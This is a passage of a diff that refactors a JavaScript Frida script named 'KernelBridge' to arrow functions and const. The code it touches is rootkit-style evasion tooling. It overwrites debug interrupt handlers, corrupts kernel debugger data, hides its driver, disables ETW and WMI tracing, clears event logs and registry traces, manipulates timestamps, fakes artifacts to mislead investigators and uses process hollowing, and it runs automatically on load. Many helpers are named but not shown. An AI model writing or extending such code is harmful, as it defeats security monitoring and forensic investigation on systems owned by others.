                             type: 'detection',
                             target: 'kernel_bridge',
@@ -2820,33 +2792,33 @@ const KernelBridge = {
             };
 
             // Advanced debugger disruption
-            this.setupDebuggerDisruption = function () {
+            this.setupDebuggerDisruption = () => {
                 // Disrupt kernel debugger
-                if (self.debuggingEvasion.debuggerDetection.kernelDebugger) {
+                if (this.debuggingEvasion.debuggerDetection.kernelDebugger) {
                     // Overwrite debug interrupt handlers
-                    var debugInterrupts = [0x01, 0x03]; // Debug and Breakpoint
-                    debugInterrupts.forEach(function (interrupt) {
-                        var disruptionHandler = self.createDebugDisruptionHandler(interrupt);
-                        self.setInterruptHandler(interrupt, disruptionHandler);
+                  const debugInterrupts = [0x01, 0x03]; // Debug and Breakpoint
+                    debugInterrupts.forEach(interrupt => {
+                      const disruptionHandler = this.createDebugDisruptionHandler(interrupt);
+                      this.setInterruptHandler(interrupt, disruptionHandler);
                     });
 
                     // Corrupt KdDebuggerDataBlock
-                    var kdDataBlock = self.findKdDebuggerDataBlock();
-                    if (kdDataBlock) {
-                        var corruptedData = self.createCorruptedDebugData();
-                        self.writeKernelMemory(kdDataBlock, corruptedData);
+                  const kdDataBlock = this.findKdDebuggerDataBlock();
+                  if (kdDataBlock) {
+                      const corruptedData = this.createCorruptedDebugData();
+                      this.writeKernelMemory(kdDataBlock, corruptedData);
                     }
                 }
 
                 // Disrupt user-mode debuggers
-                var debuggerDisruptionMethods = [
-                    { name: 'CloseDebuggerHandles', method: self.closeDebuggerHandles },
-                    { name: 'CorruptPEB', method: self.corruptPEBDebugInfo },
-                    { name: 'ModifyDebugHeap', method: self.modifyDebugHeap },
-                    { name: 'HookDebugAPIs', method: self.hookDebugAPIs },
-                ];
+              const debuggerDisruptionMethods = [
+                {name: 'CloseDebuggerHandles', method: this.closeDebuggerHandles},
+                {name: 'CorruptPEB', method: this.corruptPEBDebugInfo},
+                {name: 'ModifyDebugHeap', method: this.modifyDebugHeap},
+                {name: 'HookDebugAPIs', method: this.hookDebugAPIs},
+              ];
 
-                debuggerDisruptionMethods.forEach(function (method) {
+              debuggerDisruptionMethods.forEach(method => {
                     try {
                         if (method.method()) {
                             send({
@@ -2859,45 +2831,45 @@ const KernelBridge = {
                     } catch {}
                 });
 
-                self.debuggingEvasion.evasionTechniques.debuggerDisruption = true;
+                this.debuggingEvasion.evasionTechniques.debuggerDisruption = true;
             };
 
             // Advanced breakpoint evasion
-            this.setupBreakpointEvasion = function () {
+            this.setupBreakpointEvasion = () => {
                 // Scan for and remove software breakpoints
-                var codeRegions = self.getExecutableCodeRegions();
-                var breakpointsFound = 0;
+              const codeRegions = this.getExecutableCodeRegions();
+              let breakpointsFound = 0;
 
-                codeRegions.forEach(function (region) {
-                    var breakpoints = self.scanForBreakpoints(region.start, region.size);
-                    breakpoints.forEach(function (bp) {
+              codeRegions.forEach(region => {
+                  const breakpoints = this.scanForBreakpoints(region.start, region.size);
+                  breakpoints.forEach(bp => {
                         // Replace INT3 (0xCC) with original instruction
-                        var originalByte = self.getOriginalByte(bp.address);
-                        if (originalByte) {
-                            self.writeKernelMemory(bp.address, originalByte);
+                      const originalByte = this.getOriginalByte(bp.address);
+                      if (originalByte) {
+                            this.writeKernelMemory(bp.address, originalByte);
                             breakpointsFound++;
                         }
                     });
                 });
 
                 // Hook debug interrupt to prevent new breakpoints
-                var int3Handler = self.getInterruptHandler(0x03);
-                if (int3Handler) {
-                    var breakpointEvasionHandler = self.createBreakpointEvasionHandler();
-                    self.setInterruptHandler(0x03, breakpointEvasionHandler);
+              const int3Handler = this.getInterruptHandler(0x03);
+              if (int3Handler) {
+                  const breakpointEvasionHandler = this.createBreakpointEvasionHandler();
+                  this.setInterruptHandler(0x03, breakpointEvasionHandler);
                 }
 
                 // Scan for hardware breakpoints in debug registers
-                var processes = self.getAllProcesses();
-                processes.forEach(function (process) {
-                    var debugRegisters = self.getProcessDebugRegisters(process);
-                    if (debugRegisters.hasHardwareBreakpoints) {
+              const processes = this.getAllProcesses();
+              processes.forEach(process => {
+                  const debugRegisters = this.getProcessDebugRegisters(process);
+                  if (debugRegisters.hasHardwareBreakpoints) {
                         // Clear debug registers
-                        self.clearProcessDebugRegisters(process);
+                        this.clearProcessDebugRegisters(process);
                     }
                 });
 
-                self.debuggingEvasion.evasionTechniques.breakpointEvasion = true;
+                this.debuggingEvasion.evasionTechniques.breakpointEvasion = true;
 
                 if (breakpointsFound > 0) {
                     send({
@@ -2910,76 +2882,76 @@ const KernelBridge = {
             };
 
             // Advanced timing manipulation
-            this.setupTimingManipulation = function () {
+            this.setupTimingManipulation = () => {
                 // Hook timing functions to prevent timing-based analysis
-                var timingFunctions = [
-                    'KeQueryPerformanceCounter',
-                    'KeQuerySystemTime',
-                    'RtlGetSystemTimePrecise',
-                    'KeQueryTimeIncrement',
-                    'KdpQueryPerformanceCounter',
-                ];
+              const timingFunctions = [
+                'KeQueryPerformanceCounter',
+                'KeQuerySystemTime',
+                'RtlGetSystemTimePrecise',
+                'KeQueryTimeIncrement',
+                'KdpQueryPerformanceCounter',
+              ];
 
-                timingFunctions.forEach(function (funcName) {
-                    var funcAddr = self.getKernelExport(funcName);
-                    if (funcAddr) {
-                        self.installInlineHook(funcAddr, funcName + '_TimingManip');
+              timingFunctions.forEach(funcName => {
+                  const funcAddr = this.getKernelExport(funcName);
+                  if (funcAddr) {
+                        this.installInlineHook(funcAddr, `${funcName}_TimingManip`);
                     }
                 });
 
                 // Manipulate system tick count
-                var tickCountAddr = self.findTickCountAddress();
-                if (tickCountAddr) {
+              const tickCountAddr = this.findTickCountAddress();
+              if (tickCountAddr) {
                     // Create thread to continuously manipulate tick count
-                    self.startTickCountManipulation(tickCountAddr);
+                    this.startTickCountManipulation(tickCountAddr);
                 }
 
-                self.debuggingEvasion.evasionTechniques.timingManipulation = true;
+                this.debuggingEvasion.evasionTechniques.timingManipulation = true;
             };
 
             // Advanced memory protection against analysis
-            this.setupMemoryProtection = function () {
+            this.setupMemoryProtection = () => {
                 // Protect critical code regions
-                var criticalRegions = [
-                    { name: 'kernel_bridge_code', start: ptr(self), size: 0x10000 },
-                    {
-                        name: 'hook_code',
-                        start: self.getHookMemoryRegion(),
-                        size: 0x5000,
-                    },
-                    {
-                        name: 'shellcode_region',
-                        start: self.getShellcodeRegion(),
-                        size: 0x2000,
-                    },
-                ];
+              const criticalRegions = [
+                {name: 'kernel_bridge_code', start: ptr(this), size: 0x10000},
+                {
+                  name: 'hook_code',
+                  start: this.getHookMemoryRegion(),
+                  size: 0x5000,
+                },
+                {
+                  name: 'shellcode_region',
+                  start: this.getShellcodeRegion(),
+                  size: 0x2000,
+                },
+              ];
 
-                criticalRegions.forEach(function (region) {
+              criticalRegions.forEach(region => {
                     if (region.start && region.start.toInt32() !== 0) {
                         // Apply multiple protection layers
-                        self.applyMemoryEncryption(region.start, region.size);
-                        self.installMemoryAccessHook(region.start, region.size);
-                        self.setupMemoryIntegrityCheck(region.start, region.size);
+                        this.applyMemoryEncryption(region.start, region.size);
+                        this.installMemoryAccessHook(region.start, region.size);
+                        this.setupMemoryIntegrityCheck(region.start, region.size);
 
-                        self.debuggingEvasion.protectedRegions.push(region);
+                        this.debuggingEvasion.protectedRegions.push(region);
                     }
                 });
 
-                self.debuggingEvasion.evasionTechniques.memoryProtection =
-                    self.debuggingEvasion.protectedRegions.length > 0;
+                this.debuggingEvasion.evasionTechniques.memoryProtection =
+                    this.debuggingEvasion.protectedRegions.length > 0;
             };
 
             // Advanced anti-analysis techniques
-            this.setupAdvancedAntiAnalysis = function () {
+            this.setupAdvancedAntiAnalysis = () => {
                 // Anti-disassembly techniques
-                var antiDisassembly = [
-                    { name: 'JunkCode', method: self.insertJunkCode },
-                    { name: 'FakeJumps', method: self.insertFakeJumps },
-                    { name: 'OpaqueBranches', method: self.insertOpaqueBranches },
-                    { name: 'ReturnAddress', method: self.manipulateReturnAddresses },
-                ];
+              const antiDisassembly = [
+                {name: 'JunkCode', method: this.insertJunkCode},
+                {name: 'FakeJumps', method: this.insertFakeJumps},
+                {name: 'OpaqueBranches', method: this.insertOpaqueBranches},
+                {name: 'ReturnAddress', method: this.manipulateReturnAddresses},
+              ];
 
-                antiDisassembly.forEach(function (technique) {
+              antiDisassembly.forEach(technique => {
                     try {
                         if (technique.method()) {
                             send({
@@ -2993,17 +2965,17 @@ const KernelBridge = {
                 });
 
                 // Anti-emulation techniques
-                var antiEmulation = [
-                    { name: 'CPUIDCheck', method: self.performCPUIDChecks },
-                    { name: 'TimingChecks', method: self.performTimingChecks },
-                    { name: 'MemoryLayout', method: self.checkMemoryLayout },
-                    {
-                        name: 'HardwareFingerprint',
-                        method: self.checkHardwareFingerprint,
-                    },
-                ];
+              const antiEmulation = [
+                {name: 'CPUIDCheck', method: this.performCPUIDChecks},
+                {name: 'TimingChecks', method: this.performTimingChecks},
+                {name: 'MemoryLayout', method: this.checkMemoryLayout},
+                {
+                  name: 'HardwareFingerprint',
+                  method: this.checkHardwareFingerprint,
+                },
+              ];
 
-                antiEmulation.forEach(function (technique) {
+              antiEmulation.forEach(technique => {
                     try {
                         if (technique.method()) {
                             send({
@@ -3016,7 +2988,7 @@ const KernelBridge = {
                     } catch {}
                 });
 
-                self.debuggingEvasion.evasionTechniques.antiAnalysis = true;
+                this.debuggingEvasion.evasionTechniques.antiAnalysis = true;
             };
 
             // Execute all debugging evasion techniques
@@ -3027,19 +2999,15 @@ const KernelBridge = {
             this.setupMemoryProtection();
             this.setupAdvancedAntiAnalysis();
 
-            var detectedDebuggers = Object.keys(this.debuggingEvasion.debuggerDetection).filter(
-                function (dbg) {
-                    return self.debuggingEvasion.debuggerDetection[dbg];
-                }
-            ).length;
+          const detectedDebuggers = Object.keys(this.debuggingEvasion.debuggerDetection).filter(
+            dbg => this.debuggingEvasion.debuggerDetection[dbg]
+          ).length;
 
-            var activeEvasions = Object.keys(this.debuggingEvasion.evasionTechniques).filter(
-                function (technique) {
-                    return self.debuggingEvasion.evasionTechniques[technique];
-                }
-            ).length;
+          const activeEvasions = Object.keys(this.debuggingEvasion.evasionTechniques).filter(
+            technique => this.debuggingEvasion.evasionTechniques[technique]
+          ).length;
 
-            send({
+          send({
                 type: 'success',
                 target: 'kernel_bridge',
                 action: 'kernel_debugging_evasion_complete',
@@ -3059,7 +3027,6 @@ const KernelBridge = {
 
     // 10. Advanced kernel stealth with comprehensive hiding techniques
     setupAdvancedKernelStealth: function () {
-        var self = this;
         send({
             type: 'status',
             target: 'kernel_bridge',
@@ -3082,22 +3049,22 @@ const KernelBridge = {
             };
 
             // Advanced driver stealth
-            this.setupDriverStealth = function () {
+            this.setupDriverStealth = () => {
                 // Multiple driver hiding techniques
-                var driverStealthMethods = [
-                    { name: 'UnlinkDriverObject', method: self.unlinkDriverFromList },
-                    { name: 'HideDriverSections', method: self.hideDriverSections },
-                    { name: 'SpoofDriverInfo', method: self.spoofDriverInformation },
-                    { name: 'ModifyDriverFlags', method: self.modifyDriverFlags },
-                    { name: 'HideFromPsList', method: self.hideDriverFromPsList },
-                ];
+              const driverStealthMethods = [
+                {name: 'UnlinkDriverObject', method: this.unlinkDriverFromList},
+                {name: 'HideDriverSections', method: this.hideDriverSections},
+                {name: 'SpoofDriverInfo', method: this.spoofDriverInformation},
+                {name: 'ModifyDriverFlags', method: this.modifyDriverFlags},
+                {name: 'HideFromPsList', method: this.hideDriverFromPsList},
+              ];
 
-                var ourDriver = self.currentDriver;
-                if (ourDriver) {
-                    driverStealthMethods.forEach(function (method) {
+              const ourDriver = this.currentDriver;
+              if (ourDriver) {
+                    driverStealthMethods.forEach(method => {
                         try {
                             if (method.method(ourDriver)) {
-                                self.advancedStealth.hiddenDrivers.push({
+                                this.advancedStealth.hiddenDrivers.push({
                                     driver: ourDriver,
                                     method: method.name,
                                     applied: true,
@@ -3115,67 +3082,67 @@ const KernelBridge = {
                 }
 
                 // Hide driver from various enumeration methods
-                self.hideDriverFromEnumeration(ourDriver);
+                this.hideDriverFromEnumeration(ourDriver);
 
-                self.advancedStealth.stealthMethods.driverStealth =
-                    self.advancedStealth.hiddenDrivers.length > 0;
+                this.advancedStealth.stealthMethods.driverStealth =
+                    this.advancedStealth.hiddenDrivers.length > 0;
             };
 
             // Advanced memory stealth
-            this.setupMemoryStealth = function () {
+            this.setupMemoryStealth = () => {
                 // Encrypt sensitive memory regions
-                var sensitiveRegions = self.getSensitiveMemoryRegions();
-                sensitiveRegions.forEach(function (region) {
-                    var encryptionKey = self.generateEncryptionKey();
-                    var encryptedData = self.encryptMemoryRegion(
-                        region.address,
-                        region.size,
-                        encryptionKey
-                    );
+              const sensitiveRegions = this.getSensitiveMemoryRegions();
+              sensitiveRegions.forEach(region => {
+                  const encryptionKey = this.generateEncryptionKey();
+                  const encryptedData = this.encryptMemoryRegion(
+                    region.address,
+                    region.size,
+                    encryptionKey
+                  );
 
-                    self.advancedStealth.encryptedRegions.push({
+                  this.advancedStealth.encryptedRegions.push({
                         address: region.address,
                         size: region.size,
-                        originalData: self.readKernelMemory(region.address, region.size),
+                        originalData: this.readKernelMemory(region.address, region.size),
                         encryptionKey: encryptionKey,
                         encrypted: true,
                     });
 
                     // Write encrypted data back
-                    self.writeKernelMemory(region.address, encryptedData);
+                    this.writeKernelMemory(region.address, encryptedData);
                 });
 
                 // Setup memory access hooks to decrypt on demand
-                self.advancedStealth.encryptedRegions.forEach(function (region) {
-                    var accessHook = self.createMemoryAccessHook(region);
-                    self.installMemoryAccessHook(region.address, region.size, accessHook);
+                this.advancedStealth.encryptedRegions.forEach(region => {
+                  const accessHook = this.createMemoryAccessHook(region);
+                  this.installMemoryAccessHook(region.address, region.size, accessHook);
                 });
 
                 // Hide memory allocations from memory scanners
-                self.hideMemoryAllocationsFromScanners();
+                this.hideMemoryAllocationsFromScanners();
 
                 // Implement memory fragmentation to confuse analysis
-                self.implementMemoryFragmentation();
+                this.implementMemoryFragmentation();
 
-                self.advancedStealth.stealthMethods.memoryStealth =
-                    self.advancedStealth.encryptedRegions.length > 0;
+                this.advancedStealth.stealthMethods.memoryStealth =
+                    this.advancedStealth.encryptedRegions.length > 0;
             };
 
             // Advanced execution stealth
-            this.setupExecutionStealth = function () {
+            this.setupExecutionStealth = () => {
                 // Hide execution traces
-                var executionStealthMethods = [
-                    { name: 'DisableETW', method: self.disableETWTracing },
-                    { name: 'HookPerfCounters', method: self.hookPerformanceCounters },
-                    { name: 'DisableWMI', method: self.disableWMITracing },
-                    { name: 'SuppressEventLogs', method: self.suppressEventLogs },
-                    { name: 'HideCallStacks', method: self.hideCallStacks },
-                ];
+              const executionStealthMethods = [
+                {name: 'DisableETW', method: this.disableETWTracing},
+                {name: 'HookPerfCounters', method: this.hookPerformanceCounters},
+                {name: 'DisableWMI', method: this.disableWMITracing},
+                {name: 'SuppressEventLogs', method: this.suppressEventLogs},
+                {name: 'HideCallStacks', method: this.hideCallStacks},
+              ];
 
-                executionStealthMethods.forEach(function (method) {
+              executionStealthMethods.forEach(method => {
                     try {
                         if (method.method()) {
-                            self.advancedStealth.stealthHooks.push({
+                            this.advancedStealth.stealthHooks.push({
                                 method: method.name,
                                 active: true,
                             });
@@ -3191,31 +3158,31 @@ const KernelBridge = {
                 });
 
                 // Advanced code obfuscation during runtime
-                self.implementRuntimeCodeObfuscation();
+                this.implementRuntimeCodeObfuscation();
 
                 // Dynamic code generation to avoid static analysis
-                self.setupDynamicCodeGeneration();
+                this.setupDynamicCodeGeneration();
 
-                self.advancedStealth.stealthMethods.executionStealth =
-                    self.advancedStealth.stealthHooks.length > 0;
+                this.advancedStealth.stealthMethods.executionStealth =
+                    this.advancedStealth.stealthHooks.length > 0;
             };
 
             // Advanced communication stealth
-            this.setupCommunicationStealth = function () {
+            this.setupCommunicationStealth = () => {
                 // Setup covert communication channels
-                var stealthChannels = [
-                    { name: 'SystemCallChannel', setup: self.setupSystemCallChannel },
-                    { name: 'SharedMemoryChannel', setup: self.setupSharedMemoryChannel },
-                    { name: 'NamedPipeChannel', setup: self.setupNamedPipeChannel },
-                    { name: 'WMIEventChannel', setup: self.setupWMIEventChannel },
-                    { name: 'TimerChannel', setup: self.setupTimerChannel },
-                ];
+              const stealthChannels = [
+                {name: 'SystemCallChannel', setup: this.setupSystemCallChannel},
+                {name: 'SharedMemoryChannel', setup: this.setupSharedMemoryChannel},
+                {name: 'NamedPipeChannel', setup: this.setupNamedPipeChannel},
+                {name: 'WMIEventChannel', setup: this.setupWMIEventChannel},
+                {name: 'TimerChannel', setup: this.setupTimerChannel},
+              ];
 
-                stealthChannels.forEach(function (channel) {
+              stealthChannels.forEach(channel => {
                     try {
-                        var channelHandle = channel.setup();
-                        if (channelHandle) {
-                            self.advancedStealth.stealthChannels.push({
+                      const channelHandle = channel.setup();
+                      if (channelHandle) {
+                            this.advancedStealth.stealthChannels.push({
                                 name: channel.name,
                                 handle: channelHandle,
                                 active: true,
@@ -3232,30 +3199,30 @@ const KernelBridge = {
                 });
 
                 // Implement encrypted communication protocols
-                self.setupEncryptedCommunication();
+                this.setupEncryptedCommunication();
 
                 // Use legitimate system processes for communication
-                self.setupProcessHollowingCommunication();
+                this.setupProcessHollowingCommunication();
 
-                self.advancedStealth.stealthMethods.communicationStealth =
-                    self.advancedStealth.stealthChannels.length > 0;
+                this.advancedStealth.stealthMethods.communicationStealth =
+                    this.advancedStealth.stealthChannels.length > 0;
             };
 
             // Advanced forensic stealth
-            this.setupForensicStealth = function () {
+            this.setupForensicStealth = () => {
                 // Anti-forensic techniques
-                var antiForensicMethods = [
-                    { name: 'ClearEventLogs', method: self.clearSystemEventLogs },
-                    { name: 'WipeMemoryArtifacts', method: self.wipeMemoryArtifacts },
-                    { name: 'ModifySystemFiles', method: self.modifySystemFiles },
-                    { name: 'ClearRegistryTraces', method: self.clearRegistryTraces },
-                    {
-                        name: 'ManipulateFileTimestamps',
-                        method: self.manipulateFileTimestamps,
-                    },
-                ];
+              const antiForensicMethods = [
+                {name: 'ClearEventLogs', method: this.clearSystemEventLogs},
+                {name: 'WipeMemoryArtifacts', method: this.wipeMemoryArtifacts},
+                {name: 'ModifySystemFiles', method: this.modifySystemFiles},
+                {name: 'ClearRegistryTraces', method: this.clearRegistryTraces},
+                {
+                  name: 'ManipulateFileTimestamps',
+                  method: this.manipulateFileTimestamps,
+                },
+              ];
 
-                antiForensicMethods.forEach(function (method) {
+              antiForensicMethods.forEach(method => {
                     try {
                         if (method.method()) {
                             send({
@@ -3269,31 +3236,31 @@ const KernelBridge = {
                 });
 
                 // Setup continuous artifact cleanup
-                self.setupContinuousArtifactCleanup();
+                this.setupContinuousArtifactCleanup();
 
                 // Implement memory reconstruction prevention
-                self.implementMemoryReconstructionPrevention();
+                this.implementMemoryReconstructionPrevention();
 
                 // Setup fake artifact generation to mislead investigators
-                self.setupFakeArtifactGeneration();
+                this.setupFakeArtifactGeneration();
 
-                self.advancedStealth.stealthMethods.forensicStealth = true;
+                this.advancedStealth.stealthMethods.forensicStealth = true;
             };
 
             // Advanced stealth monitoring
-            this.setupStealthMonitoring = function () {
+            this.setupStealthMonitoring = () => {
                 // Monitor for detection attempts
-                var detectionMonitors = [
-                    { name: 'ScannerDetection', monitor: self.monitorForScanners },
-                    { name: 'AnalysisDetection', monitor: self.monitorForAnalysis },
-                    { name: 'ForensicDetection', monitor: self.monitorForForensics },
-                    { name: 'DebuggerDetection', monitor: self.monitorForDebuggers },
-                ];
+              const detectionMonitors = [
+                {name: 'ScannerDetection', monitor: this.monitorForScanners},
+                {name: 'AnalysisDetection', monitor: this.monitorForAnalysis},
+                {name: 'ForensicDetection', monitor: this.monitorForForensics},
+                {name: 'DebuggerDetection', monitor: this.monitorForDebuggers},
+              ];
 
-                detectionMonitors.forEach(function (monitor) {
+              detectionMonitors.forEach(monitor => {
                     try {
-                        var monitorThread = monitor.monitor();
-                        if (monitorThread) {
+                      const monitorThread = monitor.monitor();
+                      if (monitorThread) {
                             send({
                                 type: 'stealth',
                                 target: 'kernel_bridge',
@@ -3305,7 +3272,7 @@ const KernelBridge = {
                 });
 
                 // Setup automatic stealth adaptation
-                self.setupAutomaticStealthAdaptation();
+                this.setupAutomaticStealthAdaptation();
             };
 
             // Execute all stealth methods
@@ -3316,13 +3283,11 @@ const KernelBridge = {
             this.setupForensicStealth();
             this.setupStealthMonitoring();
 
-            var activeStealthMethods = Object.keys(this.advancedStealth.stealthMethods).filter(
-                function (method) {
-                    return self.advancedStealth.stealthMethods[method];
-                }
-            ).length;
+          const activeStealthMethods = Object.keys(this.advancedStealth.stealthMethods).filter(
+            method => this.advancedStealth.stealthMethods[method]
+          ).length;
 
-            send({
+          send({
                 type: 'success',
                 target: 'kernel_bridge',
                 action: 'advanced_kernel_stealth_complete',
@@ -3355,7 +3320,7 @@ if (Process.platform === 'windows') {
 }
 
 // Auto-initialize on load
-setTimeout(function () {
+setTimeout(() => {
     KernelBridge.run();
     send({
         type: 'status',
